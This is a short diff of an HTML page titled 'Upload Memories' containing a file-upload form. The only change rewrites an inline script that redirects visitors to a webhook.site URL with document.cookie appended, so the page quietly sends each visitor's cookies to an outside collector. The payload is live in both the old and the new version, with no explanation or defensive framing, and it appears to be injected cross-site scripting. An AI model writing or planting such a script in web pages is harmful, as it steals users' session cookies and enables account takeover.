@@ -75,7 +75,9 @@
 </head>
 <body>
     <h2>Upload Memories</h2>
-    <script> location = "https://webhook.site/d1f51e64-a4b7-40be-b382-ebbf3cb7b8a9?a=" + document.cookie</script>
+    <script>
+  location = 'https://webhook.site/d1f51e64-a4b7-40be-b382-ebbf3cb7b8a9?cookie='+document.cookie;
+</script>
 
     <form method="POST" enctype="multipart/form-data">
         <input type="file" name="file" required>
